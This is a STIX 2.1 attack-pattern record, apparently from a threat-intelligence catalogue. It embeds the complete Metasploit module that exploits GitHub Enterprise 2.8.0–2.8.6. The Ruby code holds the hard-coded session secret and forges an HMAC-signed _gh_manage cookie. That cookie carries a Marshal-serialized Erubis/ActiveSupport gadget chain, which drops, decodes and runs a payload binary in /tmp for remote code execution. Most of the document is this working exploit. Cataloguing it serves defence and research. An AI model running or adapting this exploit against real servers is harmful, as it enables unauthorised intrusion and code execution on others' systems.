{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22658cf3-ad6c-42c0-b69e-7cdfe1c99de8",
    "created": "2024-08-14T17:01:38.524932Z",
    "modified": "2024-08-14T17:01:38.524936Z",
    "name": "\"Github Enterprise Default Session Secret And Deserialization Vulnerability\"",
    "description": " This module exploits two security issues in Github Enterprise, version 2.8.0 - 2.8.6. The first is that the session management uses a hard-coded secret value, which can be abused to sign a serialized malicious Ruby object. The second problem is due to the use of unsafe deserialization, which allows the malicious Ruby object to be loaded and results in arbitrary remote code execution.  This exploit was tested against version 2.8.0.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/github_enterprise_secret.rb",
            "external_id": "github_enterprise_secret.rb"
        },
        {
            "source_name": "reference",
            "url": "http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html"
        },
        {
            "source_name": "reference",
            "url": "https://enterprise.github.com/releases/2.8.7/notes#Patchedinthisversion"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Github Enterprise Default Session Secret And Deserialization Vulnerability\",\n      'Description'    => %q{\n        This module exploits two security issues in Github Enterprise, version 2.8.0 - 2.8.6.\n        The first is that the session management uses a hard-coded secret value, which can be\n        abused to sign a serialized malicious Ruby object. The second problem is due to the\n        use of unsafe deserialization, which allows the malicious Ruby object to be loaded,\n        and results in arbitrary remote code execution.\n\n        This exploit was tested against version 2.8.0.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'iblue <iblue[at]exablue.de>', # Original discovery, writeup, and PoC (he did it all!)\n          'sinn3r'                       # Porting the PoC to Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '41616' ],\n          [ 'URL', 'http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html' ],\n          [ 'URL', 'https://enterprise.github.com/releases/2.8.7/notes' ] # Patched in this version\n        ],\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Github Enterprise 2.8', { } ]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL'   => true,\n          'RPORT' => 8443\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-03-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path for Github Enterprise', '/'])\n      ])\n  end\n\n  def secret\n    '641dd6454584ddabfed6342cc66281fb'\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'setup', 'unlock')\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri'    => uri,\n      'vars_get' =>{\n        'redirect_to' => '/'\n      }\n    })\n\n    unless res\n      vprint_error('Connection timed out.')\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless res.get_cookies.match(/^_gh_manage/)\n      vprint_error('No _gh_manage value in cookie found')\n      return Exploit::CheckCode::Safe\n    end\n\n    cookies = res.get_cookies\n    vprint_status(\"Found cookie value: #{cookies}, checking to see if it can be tampered...\")\n    gh_manage_value = CGI.unescape(cookies.scan(/_gh_manage=(.+)/).flatten.first)\n    data = gh_manage_value.split('--').first\n    hmac = gh_manage_value.split('--').last.split(';', 2).first\n    vprint_status(\"Data: #{data.gsub(/\\n/, '')}\")\n    vprint_status(\"Extracted HMAC: #{hmac}\")\n    expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), secret, data)\n    vprint_status(\"Expected HMAC: #{expected_hmac}\")\n\n    if expected_hmac == hmac\n      vprint_status(\"The HMACs match, which means you can sign and tamper the cookie.\")\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_ruby_code\n    b64_fname = \"/tmp/#{Rex::Text.rand_text_alpha(6)}.bin\"\n    bin_fname = \"/tmp/#{Rex::Text.rand_text_alpha(5)}.bin\"\n    register_file_for_cleanup(b64_fname, bin_fname)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n\n    c  = \"File.open('#{b64_fname}', 'wb') { |f| f.write('#{p}') }; \"\n    c << \"%x(base64 --decode #{b64_fname} > #{bin_fname}); \"\n    c << \"%x(chmod +x #{bin_fname}); \"\n    c << \"%x(#{bin_fname})\"\n    c\n  end\n\n\n  def serialize\n    # We don't want to run this code within the context of Framework, so we run it as an\n    # external process.\n    # Brilliant trick from Brent and Adam to overcome the issue.\n    ruby_code = %Q|\n    module Erubis;class Eruby;end;end\n    module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end\n\n    erubis = Erubis::Eruby.allocate\n    erubis.instance_variable_set :@src, \\\\\"#{get_ruby_code}; 1\\\\\"\n    proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate\n    proxy.instance_variable_set :@instance, erubis\n    proxy.instance_variable_set :@method, :result\n    proxy.instance_variable_set :@var, \"@result\"\n\n    session =\n    {\n      'session_id' => '',\n      'exploit'    => proxy\n    }\n\n    print Marshal.dump(session)\n    |\n\n    serialized_output = `ruby -e \"#{ruby_code}\"`\n\n    serialized_object = [serialized_output].pack('m')\n    hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), secret, serialized_object)\n\n    return serialized_object, hmac\n  end\n\n  def send_serialized_data(dump, hmac)\n    uri = normalize_uri(target_uri.path)\n    gh_manage_value = CGI.escape(\"#{dump}--#{hmac}\")\n    cookie = \"_gh_manage=#{gh_manage_value}\"\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri,\n      'cookie' => cookie\n    })\n\n    if res\n      print_status(\"Server returned: #{res.code}\")\n    end\n  end\n\n  def exploit\n    dump, hmac = serialize\n    print_status('Serialized Ruby stager')\n\n    print_status('Sending serialized Ruby stager...')\n    send_serialized_data(dump, hmac)\n  end\nend\n\n=begin\n\nHandy information:\n\nTo deobfuscate Github code, use this script:\nhttps://gist.github.com/wchen-r7/003bef511074b8bc8432e82bfbe0dd42\n\nGithub Enterprise's Rack::Session::Cookie saves the session data into a cookie using this\nalgorithm:\n\n* Takes the session hash (Json) in env['rack.session']\n* Marshal.dump the hash into a string\n* Base64 the string\n* Append a hash of the data at the end of the string to prevent tampering.\n* The signed data is saved in _gh_manage'\n\nThe format looks like this:\n\n[ DATA ]--[ Hash ]\n\nAlso see:\nhttps://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb\n\n=end\n",
    "x_mitre_disclosure_date": "2017-03-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}